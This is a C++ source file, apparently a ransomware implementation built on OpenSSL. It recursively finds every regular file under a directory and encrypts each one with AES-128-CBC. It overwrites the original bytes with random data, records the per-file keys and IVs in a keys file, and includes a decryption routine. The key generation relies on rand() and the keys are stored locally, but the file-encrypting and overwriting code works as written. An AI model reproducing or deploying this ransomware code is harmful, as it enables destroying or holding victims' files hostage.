#include "ransomware.h"

#include <iostream>
#include <filesystem>
#include <openssl/evp.h>

#include <fmt/format.h>
#include <fstream>

Encryptor::Encryptor(std::filesystem::path const &rootPath, bool decrypt)
    : rootPath_(rootPath),
      decrypt_(decrypt)
{
    auto rootEntry = std::filesystem::directory_entry(rootPath);
    if (!rootEntry.is_directory()) {
        throw std::runtime_error(fmt::format("{} is not a directory", std::filesystem::absolute(rootPath).string()));
    }

    auto keysPath = rootPath;
    keysPath /= KEYS_FILENAME;

    bool keysFileExist = std::filesystem::exists(keysPath);

    if (decrypt_ && keysFileExist) {
        return;
    } else if (decrypt) {
        throw std::runtime_error(fmt::format("Decryption mode engaged, but {} does not exist", keysPath.string()));
    }

    if (keysFileExist) {
        throw std::runtime_error(fmt::format("{} already exists", keysPath.string()));
    }

    ProcessDirectory(rootEntry);

    for (auto &file: regularFiles_) {
        std::cout << fmt::format("Found regular file: {}\n", file.string()) << std::flush;
    }
}

void Encryptor::ProcessDirectory(const std::filesystem::directory_entry &rootEntry)
{
    for (auto &e: std::filesystem::recursive_directory_iterator(rootEntry)) {
        if (e.is_regular_file()) {
            regularFiles_.emplace_back(e.path());
        }
    }
}

void Encryptor::Encrypt()
{
    auto keysPath = rootPath_;
    keysPath /= KEYS_FILENAME;

    auto keysOS = std::ofstream(keysPath.string());
    for (auto &filePath: regularFiles_) {
        EncryptRegularFile(filePath, keysOS);
    }

    std::cout << "Encryption finished\n" << std::flush;
}

void Encryptor::Decrypt()
{
    auto keysPath = rootPath_;
    keysPath /= KEYS_FILENAME;

    auto keysIF = std::ifstream(keysPath.string());

    std::string filePath = {};
    while (keysIF >> filePath) {
        std::string iv; keysIF >> iv;
        std::string key; keysIF >> key;
        std::cout << fmt::format("file {}\niv {}\nkey {}\n", filePath, iv, key) << std::flush;


        auto tmpFilePath = filePath;
        tmpFilePath += ".tmp";

        constexpr static auto IV_SIZE = 16;
        constexpr static auto KEY_SIZE = 16;
        constexpr static auto CHUNK_SIZE = 512;

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), nullptr, nullptr, nullptr, 1);
        OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == KEY_SIZE);
        OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == IV_SIZE);

        EVP_CipherInit_ex(ctx, nullptr, nullptr, (std::uint8_t *)key.c_str(), (std::uint8_t *)iv.c_str(), 0);

        FILE *file = std::fopen(filePath.c_str(), "rb");
        FILE *tmpFile = std::fopen(tmpFilePath.c_str(), "wb");

        auto inBuf = std::make_unique<std::uint8_t[]>(CHUNK_SIZE);
        auto outBuf = std::make_unique<std::uint8_t[]>(CHUNK_SIZE + EVP_MAX_BLOCK_LENGTH);

        int inLen = 0;
        int outLen = 0;

        for(;;) {
            inLen = std::fread(inBuf.get(), 1, CHUNK_SIZE, file);
            if (inLen <= 0) {
                break;
            }
            if (!EVP_CipherUpdate(ctx, outBuf.get(), &outLen, inBuf.get(), inLen)) {
                EVP_CIPHER_CTX_cleanup(ctx);
                throw std::runtime_error(fmt::format("Failed to decrypt file {}", filePath));
            }
            std::fwrite(outBuf.get(), 1, outLen, tmpFile);
        }
        if (!EVP_CipherFinal_ex(ctx, outBuf.get(), &outLen)) {
            EVP_CIPHER_CTX_cleanup(ctx);
            throw std::runtime_error(fmt::format("Failed to encrypt file {}", filePath));
        }
        std::fwrite(outBuf.get(), 1, outLen, tmpFile);
        EVP_CIPHER_CTX_cleanup(ctx);

        fclose(file);
        fclose(tmpFile);

        std::filesystem::remove(filePath);
        std::filesystem::rename(tmpFilePath, filePath);
    }

    keysIF.close();
    std::filesystem::remove(keysPath);
}

Encryptor::Key Encryptor::GenerateKey(int length)
{
    auto key = std::make_unique<std::uint8_t[]>(length + 1);
    std::memset(key.get(), 0, length + 1);

    for (int n = 0; n < length; n++) {
        int charId = std::rand() % (sizeof(CHARSET) - 1);
        key[n] = CHARSET[charId];
    }
    return key;
}

void Encryptor::EncryptRegularFile(std::filesystem::path const &filePath, std::ofstream &keysOS)
{
    std::cout << fmt::format("Processing regular file: {}\n", filePath.string()) << std::flush;

    auto tmpFilePath = filePath;
    tmpFilePath += ".tmp";

    constexpr static auto IV_SIZE = 16;
    constexpr static auto KEY_SIZE = 16;
    constexpr static auto CHUNK_SIZE = 512;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), nullptr, nullptr, nullptr, 1);
    OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == KEY_SIZE);
    OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == IV_SIZE);

    auto const iv = GenerateKey(IV_SIZE);
    auto const key = GenerateKey(KEY_SIZE);

    keysOS << fmt::format("{} {} {}\n", filePath.string(), iv.get(), key.get());

    EVP_CipherInit_ex(ctx, nullptr, nullptr, key.get(), iv.get(), 1);

    FILE *file = std::fopen(filePath.c_str(), "r+b");
    FILE *tmpFile = std::fopen(tmpFilePath.c_str(), "wb");

    auto inBuf = std::make_unique<std::uint8_t[]>(CHUNK_SIZE);
    auto outBuf = std::make_unique<std::uint8_t[]>(CHUNK_SIZE + EVP_MAX_BLOCK_LENGTH);

    int inLen = 0;
    int outLen = 0;

    for(;;) {
        inLen = std::fread(inBuf.get(), 1, CHUNK_SIZE, file);
        if (inLen <= 0) {
            break;
        }
        if (!EVP_CipherUpdate(ctx, outBuf.get(), &outLen, inBuf.get(), inLen)) {
            EVP_CIPHER_CTX_cleanup(ctx);
            throw std::runtime_error(fmt::format("Failed to encrypt file {}", filePath.string()));
        }
        std::fwrite(outBuf.get(), 1, outLen, tmpFile);
        std::fseek(file, -inLen, SEEK_CUR);
        auto gibberish = GenerateKey(inLen);
        std::fwrite(gibberish.get(), 1, inLen, file);
    }
    if (!EVP_CipherFinal_ex(ctx, outBuf.get(), &outLen)) {
        EVP_CIPHER_CTX_cleanup(ctx);
        throw std::runtime_error(fmt::format("Failed to encrypt file {}", filePath.string()));
    }
    std::fwrite(outBuf.get(), 1, outLen, tmpFile);
    EVP_CIPHER_CTX_cleanup(ctx);

    std::fflush(file);
    fclose(file);

    fclose(tmpFile);

    std::filesystem::remove(filePath);
    std::filesystem::rename(tmpFilePath, filePath);
}
